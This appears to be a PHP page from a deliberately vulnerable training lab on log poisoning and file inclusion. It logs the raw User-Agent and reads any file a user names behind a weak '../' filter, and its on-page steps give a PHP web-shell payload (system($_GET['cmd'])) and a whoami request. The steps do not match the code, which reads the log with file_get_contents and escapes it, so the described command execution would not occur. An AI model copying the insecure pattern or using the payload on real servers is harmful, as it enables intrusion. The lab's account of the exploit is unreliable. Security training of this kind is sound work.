<?php
// 日志包含
$page = $_GET['page'] ?? '';
$content = null;

// 记录访问日志（漏洞：User-Agent直接写入日志）
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$logEntry = date('Y-m-d H:i:s') . ' | ' . $_SERVER['REMOTE_ADDR'] . ' | ' . $ua . ' | ' . $_SERVER['REQUEST_URI'] . PHP_EOL;
@file_put_contents(__DIR__ . '/access.log', $logEntry, FILE_APPEND);

if ($page) {
    // 过滤了 ../，但日志文件在同目录
    $page = str_replace('../', '', $page);
    $content = @file_get_contents($page);
    if ($content === false) {
        $content = '无法加载：' . h($page);
    }
}
?>

<p>页面加载（日志包含）</p>
<p>无法直接包含敏感文件，但访问日志中记录了User-Agent，且可被包含。</p>

<?php if ($content): ?>
    <div class="result-box" style="max-height:300px; overflow-y:auto;"><?= h($content) ?></div>
<?php endif; ?>

<p style="margin-top:1rem; font-size:0.8rem; color:var(--text-muted);">
    攻击步骤：<br>
    1. 用Burp修改 User-Agent 为 &lt;?php system($_GET['cmd']); ?&gt;<br>
    2. 访问本页面，PHP代码写入 access.log<br>
    3. 包含日志文件：?page=access.log&cmd=whoami
</p>
